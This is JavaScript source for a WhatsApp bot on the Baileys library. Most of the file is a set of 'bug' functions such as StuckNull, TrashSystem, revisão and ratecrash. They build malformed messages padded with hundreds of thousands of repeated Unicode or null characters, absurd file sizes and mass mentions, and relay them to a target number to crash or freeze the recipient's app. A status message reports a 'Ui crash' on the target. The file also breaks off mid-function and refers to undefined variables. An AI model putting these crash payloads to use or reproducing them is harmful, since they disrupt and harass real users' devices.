
require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')

const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (PannOfficiaL, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
var budy = (typeof m.text == 'string' ? m.text: '')
var prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (PannOfficiaL.user.id.split(':')[0]+'@s.whatsapp.net' || PannOfficiaL.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await PannOfficiaL.decodeJid(PannOfficiaL.user.id)
const senderNumber = sender.split('@')[0]
const orgkaya = JSON.parse(fs.readFileSync('./database/owner.json'))
const kontributor = JSON.parse(fs.readFileSync('./database/owner.json'))
const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium, ...kontributor].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = (m && m.sender && [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)


const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await PannOfficiaL.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
//====================================\\
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'));
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'));
if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await PannOfficiaL.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = global.limitawal.free
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!isNumber(user.limit)) user.limit = limitUser
} else global.db.data.users[m.sender] = {
afkTime: -1,
afkReason: '',
limit: limitUser,
}
} catch (err) {
console.log(err)
} 

// respon list 
if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
PannOfficiaL.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
PannOfficiaL.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}

const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
async function generateDoneBug () {
    try {
        const thumbnail = 'https://i.postimg.cc/L5ssf5WL/jadwal.png'; 
        const message = `⪨ sᴜᴄᴄᴇs ʙᴜɢ ᴛᴏ target whatsapp       
                         sᴛᴀᴛᴜs : ᴅᴏɴᴇ                        
                         ᴍᴏᴅᴇ : *VIP*                                                                                       
                         --------------------[ *NOTE* ]--------------------    
                         > Jika c2 Maka Target Terkena Ui crash ☠️`;
        
        return { thumbnail, message };
    } catch (error) {
        console.error("Error generating donebug:", error);
    }
}

   

    const fkethmb = await reSize(ppuser, 300, 300)
    const GetsuZo = fs.readFileSync(`./system/image/EsQl.jpg`);
    const GetSuZo = fs.readFileSync(`./system/image/ViLoc.jpg`);
    const nulll = fs.readFileSync(`./system/image/nulll.jpg`);
    const zkosong = fs.readFileSync(`./system/image/zkosong.jpg`);
const anjay = fs.readFileSync(`./system/image/anjay.jpg`)
const qris = fs.readFileSync(`./system/image/qris.jpg`)
const { button } = require("./lib/ngentot.js")
const {
      ios: _0xe071f
    } = require("./system/revision/ios.js");
    const {
      telapreta3: _0x251e7d
    } = require("./system/revision/telapreta3.js");
    const {
      convite: _0x580066
    } = require("./system/revision/convite.js");
    const {
      bugpdf: _0xde4be7
    } = require("./system/revision/bugpdf.js");
    const {
      cP: _0x155b54
    } = require("./system/revision/bugUrl.js");
    const {
      beta1: _0x2ce83d,
      beta2: _0x413d51,
      buk1: _0x1c309b
    } = require("./system/revision/hdr.js");
const { ios } = require("./lib/ios.js")
const { andro } = require("./lib/andro.js")
    // function resize
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};
// 𝘙𝘌𝘗𝘓𝘠
async function loading () {
var genalpa = [
"REC",
"REVISI",
"REVISION"
]
let { key } = await PannOfficiaL.sendMessage(m.chat, {text: 'REVISION'})

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

for (let i = 0; i < genalpa.length; i++) {
await sleep(10)
await PannOfficiaL.sendMessage(m.chat, {text: genalpa[i], edit: key });
}
}




// FUNCTION BUG //
function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return 
    PannOfficiaL.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return PannOfficiaL.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `REVISION`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6283870771598:+6283870771598\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qdoc = {
key: {
participant: '0@s.whatsapp.net',
...(m.chat ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
documentMessage: {
title: `🪨Msg ${m.body || m.mtype}`,
jpegThumbnail: dokupalsu,
}
}
}

const oneclick = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `ジンクスバグ 𝐙𝐢𝐢𝐱 𝐈𝐬 𝐁𝐚𝐜𝐤`
}
}
}

const zynbug = { 
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝐙𝐢𝐢𝐱 𝐈𝐬 𝐁𝐚𝐜𝐤`
}
}
}


async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "ZIIX CRASH WHATSAPP"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'Zynxzo', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await PannOfficiaL.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}




 async function StuckNull(X, ThM, Ptcp = true) {
      await PannOfficiaL.relayMessage(
        X,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑̤\n" +
                    "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(27000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6283846077142@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }

async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "⿻ CrazyCrash ⿻",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ CrazyUi ⿻ ▾⭑" + "ꦾ" + "ꦾ".repeat(77777),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await PannOfficiaL.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }

async function TrashSystem(X, ThM, Ptcp = true) {
      await PannOfficiaL.relayMessage(
        X,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⭑̤▾ ⿻ CrazyCrash ⿻ ▾⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "⭑̤▾ ⿻ CrazyCrash System⿻ ▾⭑̤\n" +
                    "@6283846077142".repeat(17000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: [
                    "6283846077142@s.whatsapp.net",
                    ...Array.from(
                      {
                        length: 40000,
                      },
                      () =>
                        "1" +
                        Math.floor(Math.random() * 900000) +
                        "@s.whatsapp.net"
                    ),
                  ],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By Dqr ¿"));
    }

async function documento(target, wanted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `⃟𝐃𝐐𝐑 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴▾.xp`+"𑶑𑶑𑶑𑶑𑶑𑶑𑶑𑶑".repeat(90000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}



        async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await PannOfficiaL.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}

      async function revisão(target, wanted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "𝐃҈ۣ҈ۣ𝐐҈ۣ𝐑 ҈ۣ̊̊"+"۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤ".repeat(920000),
        'footerText': `𝐃҈ۣ҈ۣ𝐐҈ۣ𝐑 ҈ۣ̊.xp`,
        'description': `𝐃҈ۣ҈ۣ𝐐҈ۣ𝐑 ҈ۣ.xp`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: wanted });
await PannOfficiaL.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function lawaz(Pe) {
      var vGenerateWAMessageFromContent11 = generateWAMessageFromContent(Pe, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "nonton dengan oboy" + "᳡᳢᳣᳤᳔᳙᳜᳕᳟᳑᳐᳒".repeat(100000),
              jpegThumbnail: "",
              caption: "okep vvip by oboy",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: Pe
      });
      await PannOfficiaL.relayMessage(Pe, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: Pe
        },
        messageId: vGenerateWAMessageFromContent11.key.id
      });
    }

async function xdqr(target, ultraviolet) {
await PannOfficiaL.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: "revision" + "𑶑".repeat(300000)
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Revision " }]
}
}
}
}
}, { participant: { jid: target } }, { messageId: null });
}


async function tiriz(target, ultraviolet) {
await PannOfficiaL.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: "revisionꫂ" + "ۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢ۬ۤۢۤۢ۬ۤۢ۬ۤۢ".repeat(300000)
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
groupMentions: [{ groupJid: "1@newsletter", groupSubject: " Revision " }]
}
}
}
}
}, { participant: { jid: target } }, { messageId: null });
}

async function LIVELOK(X, VxO) {
      var etc = generateWAMessageFromContent(
        LockJids,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              liveLocationMessage: {
                degreesLatitude: "x",
                degreesLongitude: "x",
                caption: `😁҈𝐃҈ۣ҈ۣ𝐐҈ۣ𝐑 ҈ۣ҈` + "\u0000",
                sequenceNumber: "0",
                jpegThumbnail: "",
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VxO,
        }
      );
      await PannOfficiaL.relayMessage(LockJids, etc.message, {
        messageId: etc.key.id,
      });
    }



async function locationcrash(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `*\`ꪶꪹClueXbugCrash.Com᭢\`* ${telapreta3}`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await WynzX.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}


async function ratecrash(Pe) {
      var vGenerateWAMessageFromContent11 = generateWAMessageFromContent(Pe, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "nonton dengan oboy" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "Undangan Admin Bokep",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: Pe
      });
      await PannOfficiaL.relayMessage(Pe, vGenerateWAMessageFromContent11.message, {
        participant: {
          jid: Pe
        },
        messageId: vGenerateWAMessageFromContent11.key.id
      });
    }


async function GlX(X, Ptcp = true) {
      await PannOfficiaL.relayMessage(
        X,
        {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "⿻ CrazyCrash ⿻",
                  format: "EXTENSIONS_1",
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
